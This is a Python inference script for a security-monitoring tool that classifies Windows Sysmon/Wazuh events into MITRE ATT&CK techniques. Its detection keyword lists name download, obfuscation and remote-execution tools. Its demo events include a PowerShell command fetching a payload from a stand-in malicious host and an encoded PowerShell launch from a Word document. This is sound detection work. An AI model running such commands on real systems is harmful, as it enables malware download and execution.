"""
SmartSOC
Windows-APT Model B v3
Production-Style Inference Pipeline

Pipeline:

Wazuh / Sysmon Event
        |
        v
Structured Feature Extraction
        |
        +--> Categorical features -> OneHotEncoder
        |
        +--> Numerical features   -> numeric matrix
        |
        +--> Behavioral text      -> TF-IDF
        |
        v
Hybrid Feature Matrix
        |
        v
Calibrated One-vs-Rest Model
        |
        v
MITRE ATT&CK Techniques
        |
        v
Technique-specific thresholds
        |
        v
Prediction + confidence
"""

from pathlib import Path
import json
import sys

import joblib
import numpy as np
import pandas as pd
from scipy.sparse import csr_matrix, hstack


# ============================================================
# PATHS
# ============================================================

PROJECT_ROOT = Path(__file__).resolve().parents[3]

MODEL_DIR = PROJECT_ROOT / "models" / "windows_apt_v3"

MODEL_PATH = MODEL_DIR / "multilabel_logistic_v3_calibrated.joblib"
STRUCTURED_ENCODER_PATH = MODEL_DIR / "structured_encoder_calibrated.joblib"
TFIDF_PATH = MODEL_DIR / "tfidf_vectorizer_calibrated.joblib"
LABEL_ENCODER_PATH = MODEL_DIR / "multilabel_encoder_calibrated.joblib"
THRESHOLD_PATH = MODEL_DIR / "technique_thresholds.json"
SCHEMA_PATH = MODEL_DIR / "feature_schema_calibrated_v3.json"


# ============================================================
# LOAD ARTIFACTS
# ============================================================

def load_artifacts():

    print("=" * 75)
    print(" SmartSOC Windows-APT Model B v3 - Inference")
    print("=" * 75)

    required_files = [
        MODEL_PATH,
        STRUCTURED_ENCODER_PATH,
        TFIDF_PATH,
        LABEL_ENCODER_PATH,
        THRESHOLD_PATH,
        SCHEMA_PATH,
    ]

    print("\nChecking model artifacts...")

    for path in required_files:

        if not path.exists():
            raise FileNotFoundError(
                f"Required artifact not found:\n{path}"
            )

        print(f"[OK] {path}")

    print("\nLoading artifacts...")

    model = joblib.load(MODEL_PATH)
    structured_encoder = joblib.load(STRUCTURED_ENCODER_PATH)
    tfidf = joblib.load(TFIDF_PATH)
    label_encoder = joblib.load(LABEL_ENCODER_PATH)

    with open(THRESHOLD_PATH, "r", encoding="utf-8") as f:
        thresholds = json.load(f)

    with open(SCHEMA_PATH, "r", encoding="utf-8") as f:
        schema = json.load(f)

    print("Model loaded.")
    print("Structured encoder loaded.")
    print("TF-IDF loaded.")
    print("Label encoder loaded.")
    print("Thresholds loaded.")
    print("Feature schema loaded.")

    return (
        model,
        structured_encoder,
        tfidf,
        label_encoder,
        thresholds,
        schema,
    )


# ============================================================
# SAFE VALUE HELPERS
# ============================================================

def safe_string(value):
    """
    Convert None / NaN values to an empty string.
    """

    if value is None:
        return ""

    try:
        if pd.isna(value):
            return ""
    except Exception:
        pass

    return str(value)


def safe_int(value, default=0):

    try:

        if value is None:
            return default

        if pd.isna(value):
            return default

        return int(float(value))

    except Exception:

        return default


def safe_float(value, default=0.0):

    try:

        if value is None:
            return default

        if pd.isna(value):
            return default

        return float(value)

    except Exception:

        return default


# ============================================================
# FEATURE EXTRACTION
# ============================================================

def build_structured_features(event, schema):

    categorical_columns = schema["categorical_columns"]
    numerical_columns = schema["numerical_columns"]

    row = {}

    # --------------------------------------------------------
    # Raw / categorical process information
    # --------------------------------------------------------

    row["process_name"] = safe_string(
        event.get("process_name")
    )

    row["parent_process_name"] = safe_string(
        event.get("parent_process_name")
    )

    row["process_extension"] = safe_string(
        event.get("process_extension")
    )

    row["parent_extension"] = safe_string(
        event.get("parent_extension")
    )

    # --------------------------------------------------------
    # Basic numerical fields
    # --------------------------------------------------------

    for column in numerical_columns:

        if column in row:
            continue

        row[column] = safe_float(
            event.get(column, 0)
        )

    # --------------------------------------------------------
    # Explicit integer / binary normalization
    # --------------------------------------------------------

    binary_columns = [
        "is_sysmon",
        "is_security_channel",
        "has_process_image",
        "has_parent_image",
        "has_user",
        "has_parent_user",
        "is_system_user",
        "is_admin_user",
        "integrity_high",
        "integrity_medium",
        "has_command_line",
        "has_parent_command",
        "uses_powershell",
        "uses_cmd",
        "uses_net",
        "uses_whoami",
        "uses_schtasks",
        "uses_reg",
        "uses_rundll32",
        "uses_wmic",
        "uses_certutil",
        "uses_bitsadmin",
        "uses_ipconfig",
        "uses_netstat",
        "uses_tasklist",
        "uses_sc",
        "uses_mshta",
        "uses_regsvr32",
        "uses_cscript",
        "uses_wscript",
        "uses_wevtutil",
        "uses_vssadmin",
        "has_encoded_command",
        "has_download_behavior",
        "has_remote_execution_hint",
        "has_registry_operation",
        "has_file_deletion",
        "has_obfuscation_hint",
        "same_process_parent",
        "suspicious_parent_wazuh",
        "has_hash",
        "has_sha256",
        "has_md5",
        "has_source_ip",
        "has_destination_ip",
        "has_source_port",
        "has_destination_port",
        "has_protocol",
        "is_network_event",
        "has_target_filename",
        "has_image_loaded",
        "has_target_object",
    ]

    for column in binary_columns:

        if column in row:
            row[column] = safe_int(
                event.get(column, row[column])
            )

    # --------------------------------------------------------
    # Derived values
    # --------------------------------------------------------

    process_name = row["process_name"].lower()
    parent_name = row["parent_process_name"].lower()

    command_line = safe_string(
        event.get("command_line")
    ).lower()

    parent_command_line = safe_string(
        event.get("parent_command_line")
    ).lower()

    # --------------------------------------------------------
    # Process image
    # --------------------------------------------------------

    if not row.get("has_process_image", 0):
        row["has_process_image"] = int(
            bool(process_name)
        )

    if not row.get("has_parent_image", 0):
        row["has_parent_image"] = int(
            bool(parent_name)
        )

    # --------------------------------------------------------
    # Command line
    # --------------------------------------------------------

    if not row.get("has_command_line", 0):
        row["has_command_line"] = int(
            bool(command_line)
        )

    if not row.get("has_parent_command", 0):
        row["has_parent_command"] = int(
            bool(parent_command_line)
        )

    if not row.get("command_length", 0):
        row["command_length"] = len(command_line)

    if not row.get("parent_command_length", 0):
        row["parent_command_length"] = len(parent_command_line)

    # --------------------------------------------------------
    # PowerShell
    # --------------------------------------------------------

    if not row.get("uses_powershell", 0):

        row["uses_powershell"] = int(
            "powershell" in process_name
            or "powershell" in command_line
        )

    # --------------------------------------------------------
    # CMD
    # --------------------------------------------------------

    if not row.get("uses_cmd", 0):

        row["uses_cmd"] = int(
            process_name in ["cmd.exe", "cmd"]
            or "cmd.exe" in command_line
        )

    # --------------------------------------------------------
    # Network / download behavior
    # --------------------------------------------------------

    if not row.get("has_download_behavior", 0):

        download_terms = [
            "invoke-webrequest",
            "invoke-restmethod",
            "downloadstring",
            "downloadfile",
            "bitsadmin",
            "certutil",
            "curl",
            "wget",
            "http://",
            "https://",
        ]

        row["has_download_behavior"] = int(
            any(term in command_line for term in download_terms)
        )

    # --------------------------------------------------------
    # Encoded command
    # --------------------------------------------------------

    if not row.get("has_encoded_command", 0):

        row["has_encoded_command"] = int(
            "-enc" in command_line
            or "-encodedcommand" in command_line
            or "frombase64string" in command_line
        )

    # --------------------------------------------------------
    # Obfuscation
    # --------------------------------------------------------

    if not row.get("has_obfuscation_hint", 0):

        obfuscation_terms = [
            "frombase64string",
            "-enc",
            "-encodedcommand",
            "iex",
            "invoke-expression",
            "char(",
            "[convert]",
        ]

        row["has_obfuscation_hint"] = int(
            any(term in command_line for term in obfuscation_terms)
        )

    # --------------------------------------------------------
    # Registry
    # --------------------------------------------------------

    if not row.get("has_registry_operation", 0):

        row["has_registry_operation"] = int(
            "reg add" in command_line
            or "reg delete" in command_line
            or "registry" in command_line
        )

    # --------------------------------------------------------
    # Remote execution
    # --------------------------------------------------------

    if not row.get("has_remote_execution_hint", 0):

        remote_terms = [
            "psexec",
            "winrm",
            "invoke-command",
            "enter-pssession",
            "wmic",
        ]

        row["has_remote_execution_hint"] = int(
            any(term in command_line for term in remote_terms)
        )

    # --------------------------------------------------------
    # File deletion
    # --------------------------------------------------------

    if not row.get("has_file_deletion", 0):

        deletion_terms = [
            "del ",
            "erase ",
            "remove-item",
            "rmdir",
            "wevtutil cl",
        ]

        row["has_file_deletion"] = int(
            any(term in command_line for term in deletion_terms)
        )

    # --------------------------------------------------------
    # Parent Wazuh
    # --------------------------------------------------------

    if not row.get("suspicious_parent_wazuh", 0):

        row["suspicious_parent_wazuh"] = int(
            "wazuh" in parent_name
        )

    # --------------------------------------------------------
    # Process parent relationship
    # --------------------------------------------------------

    if not row.get("same_process_parent", 0):

        row["same_process_parent"] = int(
            bool(process_name)
            and bool(parent_name)
            and process_name == parent_name
        )

    # --------------------------------------------------------
    # Event ID
    # --------------------------------------------------------

    if "event_id" in numerical_columns:

        row["event_id"] = safe_float(
            event.get("event_id", 0)
        )

    # --------------------------------------------------------
    # System level
    # --------------------------------------------------------

    if "system_level" in numerical_columns:

        row["system_level"] = safe_float(
            event.get("system_level", 0)
        )

    # --------------------------------------------------------
    # Ensure exact schema
    # --------------------------------------------------------

    categorical_df = pd.DataFrame(
        [[row.get(c, "") for c in categorical_columns]],
        columns=categorical_columns
    )

    numerical_df = pd.DataFrame(
        [[
            safe_float(row.get(c, 0))
            for c in numerical_columns
        ]],
        columns=numerical_columns
    )

    return categorical_df, numerical_df


# ============================================================
# BEHAVIOR TEXT
# ============================================================

def build_behavior_text(event):

    parts = []

    fields = [
        "timestamp",
        "agent",
        "event_id",
        "process_name",
        "parent_process_name",
        "command_line",
        "parent_command_line",
        "user",
        "parent_user",
        "source_ip",
        "destination_ip",
        "source_port",
        "destination_port",
        "protocol",
        "target_filename",
        "target_object",
        "image_loaded",
        "hash",
        "sha256",
        "md5",
        "full_log",
    ]

    for field in fields:

        value = safe_string(
            event.get(field)
        )

        if value:

            parts.append(
                f"{field}={value}"
            )

    # Add behavioral indicators.
    # These correspond to the semantic signals used
    # by the feature-engineering pipeline.

    indicators = [
        "uses_powershell",
        "uses_cmd",
        "uses_net",
        "uses_whoami",
        "uses_schtasks",
        "uses_reg",
        "uses_rundll32",
        "uses_wmic",
        "uses_certutil",
        "uses_bitsadmin",
        "uses_ipconfig",
        "uses_netstat",
        "uses_tasklist",
        "uses_sc",
        "uses_mshta",
        "uses_regsvr32",
        "uses_cscript",
        "uses_wscript",
        "uses_wevtutil",
        "uses_vssadmin",
        "has_encoded_command",
        "has_download_behavior",
        "has_remote_execution_hint",
        "has_registry_operation",
        "has_file_deletion",
        "has_obfuscation_hint",
    ]

    for indicator in indicators:

        value = safe_int(
            event.get(indicator, 0)
        )

        if value:
            parts.append(indicator)

    return " ".join(parts)


# ============================================================
# INFERENCE
# ============================================================

def predict_event(
    event,
    model,
    structured_encoder,
    tfidf,
    label_encoder,
    thresholds,
    schema,
):

    categorical_df, numerical_df = build_structured_features(
        event,
        schema
    )

    # --------------------------------------------------------
    # Structured transformation
    # --------------------------------------------------------

    categorical_matrix = structured_encoder.transform(
        categorical_df
    )

    numerical_matrix = csr_matrix(
        numerical_df.astype(np.float64).values
    )

    structured_matrix = hstack(
        [
            categorical_matrix,
            numerical_matrix,
        ],
        format="csr"
    )

    # --------------------------------------------------------
    # TF-IDF
    # --------------------------------------------------------

    behavior_text = build_behavior_text(event)

    text_matrix = tfidf.transform(
        [behavior_text]
    )

    # --------------------------------------------------------
    # Hybrid feature vector
    # --------------------------------------------------------

    final_matrix = hstack(
        [
            structured_matrix,
            text_matrix,
        ],
        format="csr"
    )

    # --------------------------------------------------------
    # Safety check
    # --------------------------------------------------------

    expected_features = getattr(
        model,
        "n_features_in_",
        None
    )

    if expected_features is not None:

        if final_matrix.shape[1] != expected_features:

            raise RuntimeError(
                "Feature dimension mismatch.\n"
                f"Model expects: {expected_features}\n"
                f"Inference produced: {final_matrix.shape[1]}"
            )

    # --------------------------------------------------------
    # Probability prediction
    # --------------------------------------------------------

    probabilities = model.predict_proba(
        final_matrix
    )

    # One-vs-Rest probability matrix
    if probabilities.ndim == 1:
        probabilities = probabilities.reshape(1, -1)

    probabilities = probabilities[0]

    classes = list(
        label_encoder.classes_
    )

    predictions = []

    for index, technique in enumerate(classes):

        probability = float(
            probabilities[index]
        )

        threshold = float(
            thresholds.get(
                technique,
                0.50
            )
        )

        if probability >= threshold:

            predictions.append(
                {
                    "technique": technique,
                    "confidence": round(
                        probability,
                        4
                    ),
                    "threshold": round(
                        threshold,
                        4
                    ),
                }
            )

    # --------------------------------------------------------
    # Fallback
    # --------------------------------------------------------

    if not predictions:

        best_index = int(
            np.argmax(probabilities)
        )

        best_technique = classes[
            best_index
        ]

        predictions.append(
            {
                "technique": best_technique,
                "confidence": round(
                    float(probabilities[best_index]),
                    4
                ),
                "threshold": round(
                    float(
                        thresholds.get(
                            best_technique,
                            0.50
                        )
                    ),
                    4
                ),
                "fallback": True,
            }
        )

    predictions.sort(
        key=lambda x: x["confidence"],
        reverse=True
    )

    return {
        "predictions": predictions,
        "behavior_text": behavior_text,
        "feature_count": final_matrix.shape[1],
    }


# ============================================================
# DEMO EVENTS
# ============================================================

def demo_events():

    return [

        {
            "name": "Normal PowerShell Administration",

            "event_id": 1,

            "process_name":
                "powershell.exe",

            "parent_process_name":
                "explorer.exe",

            "process_extension":
                "exe",

            "parent_extension":
                "exe",

            "command_line":
                "powershell.exe Get-Service",

            "parent_command_line":
                "explorer.exe",

            "user":
                "administrator",

            "is_admin_user":
                1,

            "integrity_high":
                1,

            "has_process_image":
                1,

            "has_parent_image":
                1,

            "has_user":
                1,

            "has_parent_user":
                1,

            "uses_powershell":
                1,

            "has_command_line":
                1,

            "is_sysmon":
                1,

            "is_security_channel":
                0,
        },

        {
            "name":
                "Suspicious Encoded PowerShell",

            "event_id":
                1,

            "process_name":
                "powershell.exe",

            "parent_process_name":
                "winword.exe",

            "process_extension":
                "exe",

            "parent_extension":
                "exe",

            "command_line":
                "powershell.exe -EncodedCommand SQBFAFgA",

            "parent_command_line":
                "winword.exe suspicious.docm",

            "user":
                "administrator",

            "is_admin_user":
                1,

            "integrity_high":
                1,

            "has_process_image":
                1,

            "has_parent_image":
                1,

            "has_user":
                1,

            "has_parent_user":
                1,

            "uses_powershell":
                1,

            "has_command_line":
                1,

            "has_encoded_command":
                1,

            "has_obfuscation_hint":
                1,

            "is_sysmon":
                1,

            "is_security_channel":
                0,
        },

        {
            "name":
                "Malicious Download and Execution",

            "event_id":
                1,

            "process_name":
                "powershell.exe",

            "parent_process_name":
                "cmd.exe",

            "process_extension":
                "exe",

            "parent_extension":
                "exe",

            "command_line":
                "powershell.exe Invoke-WebRequest https://malicious.example/payload.exe -OutFile C:\\Temp\\payload.exe",

            "parent_command_line":
                "cmd.exe",

            "user":
                "administrator",

            "is_admin_user":
                1,

            "integrity_high":
                1,

            "has_process_image":
                1,

            "has_parent_image":
                1,

            "has_user":
                1,

            "has_parent_user":
                1,

            "uses_powershell":
                1,

            "uses_cmd":
                1,

            "has_command_line":
                1,

            "has_download_behavior":
                1,

            "has_remote_execution_hint":
                1,

            "has_source_ip":
                1,

            "has_destination_ip":
                1,

            "has_destination_port":
                1,

            "is_network_event":
                1,

            "is_sysmon":
                1,

            "is_security_channel":
                0,
        },
    ]


# ============================================================
# MAIN
# ============================================================

def main():

    try:

        (
            model,
            structured_encoder,
            tfidf,
            label_encoder,
            thresholds,
            schema,
        ) = load_artifacts()

        print("\nModel information:")
        print(
            f"MITRE techniques : "
            f"{len(label_encoder.classes_)}"
        )

        print(
            f"TF-IDF features  : "
            f"{len(tfidf.vocabulary_)}"
        )

        print(
            f"Expected features: "
            f"{schema['final_feature_count']}"
        )

        print(
            "\nCategorical features:"
        )

        for column in schema[
            "categorical_columns"
        ]:
            print(f"  - {column}")

        print(
            "\nNumerical feature count:"
        )

        print(
            len(schema["numerical_columns"])
        )

        # ----------------------------------------------------
        # Run demonstrations
        # ----------------------------------------------------

        for number, event in enumerate(
            demo_events(),
            start=1
        ):

            print("\n")
            print("=" * 75)
            print(
                f" DEMO EVENT {number}: "
                f"{event['name']}"
            )
            print("=" * 75)

            try:

                result = predict_event(
                    event,
                    model,
                    structured_encoder,
                    tfidf,
                    label_encoder,
                    thresholds,
                    schema,
                )

                print(
                    "\nGenerated hybrid feature count:",
                    result["feature_count"]
                )

                print(
                    "\nBehavior text:"
                )

                print(
                    result["behavior_text"]
                )

                print(
                    "\nPredicted MITRE techniques:"
                )

                for prediction in result[
                    "predictions"
                ]:

                    fallback = prediction.get(
                        "fallback",
                        False
                    )

                    suffix = (
                        " [FALLBACK]"
                        if fallback
                        else ""
                    )

                    print(
                        f"  {prediction['technique']}"
                        f" | confidence="
                        f"{prediction['confidence']:.4f}"
                        f" | threshold="
                        f"{prediction['threshold']:.4f}"
                        f"{suffix}"
                    )

            except Exception as exc:

                print(
                    "\nINFERENCE ERROR:"
                )

                print(
                    type(exc).__name__,
                    ":",
                    str(exc)
                )

                print(
                    "\nThis means the inference "
                    "feature construction does not "
                    "match the calibrated training "
                    "pipeline."
                )

                raise

        print("\n")
        print("=" * 75)
        print(
            " SmartSOC Windows-APT inference test complete"
        )
        print("=" * 75)

    except Exception as exc:

        print("\n")
        print("=" * 75)
        print("FATAL INFERENCE ERROR")
        print("=" * 75)

        print(
            f"\n{type(exc).__name__}: {exc}"
        )

        sys.exit(1)


if __name__ == "__main__":
    main()